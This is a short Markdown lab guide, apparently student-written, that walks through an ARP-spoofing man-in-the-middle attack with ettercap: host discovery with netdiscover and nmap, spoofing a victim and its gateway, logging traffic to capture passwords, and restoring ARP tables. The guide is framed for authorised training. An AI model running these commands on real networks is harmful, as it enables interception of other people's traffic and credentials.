# ⚠️ MITM Attack with Ettercap (CLI Mode)

> This guide demonstrates how to perform a Man-in-the-Middle (MITM) attack using `ettercap` in **command-line mode**, for **educational purposes** in a **controlled lab environment**.

---

## 📦 Requirements

- OS: Kali Linux, Parrot OS, or any Linux distro with `ettercap-text-only`
- Tools: Ettercap CLI, Netdiscover or Nmap
- Setup:
  - Attacker: Kali Linux
  - Victim: Any host on the same LAN
  - Gateway: Your router

---

## 📥 Installation

```bash
sudo apt update
sudo apt install ettercap-text-only netdiscover nmap
```

##🌐 Step 1: Identify Network Interface
```bash
ip a
```
Example interface: eth0, wlan0, etc.
##🔍 Step 2: Scan for Hosts
###Option 1: Netdiscover
```bash
sudo netdiscover -i eth0
```
###Option 2: Nmap
```bash
sudo nmap -sn 192.168.0.0/24
```
Note the IPs of:

Victim device → VICTIM_IP

Gateway (router) → GATEWAY_IP

Your interface → INTERFACE

##🧪 Step 3: Perform ARP Spoofing (MITM)
```bash
sudo ettercap -T -M arp:remote /VICTIM_IP/ /GATEWAY_IP/ -i INTERFACE
```
###Example:
```bash
sudo ettercap -T -M arp:remote /192.168.0.105/ /192.168.0.1/ -i eth0
```

### :Flags Explained:

-T: Text (CLI) mode

-M arp:remote: ARP spoofing for both directions

/target1/ /target2/: Victim and Gateway IPs

-i: Interface to use
##🔐 Step 4: Capture Passwords (Optional)
```bash
sudo ettercap -T -M arp:remote -w mitm_log.pcap /VICTIM_IP/ /GATEWAY_IP/ -i INTERFACE
```
###Open the log with Wireshark:

```bash
wireshark mitm_log.pcap
```
##🔚 Step 5: Stop the Attack
To quit Ettercap, press q.

To restore ARP tables manually:
```bash
sudo ettercap -T -P restore_arp -i INTERFACE
```

##⚠️ Legal Warning
This guide is provided for educational and authorized penetration testing only.
Unauthorized access to networks or data is illegal and punishable by law.
Always get written permission before testing any network.

##📌 Author
Created by: [Nahid Chowdury] CSE, DU

For: Ethical Hacking / Cybersecurity Lab Practice


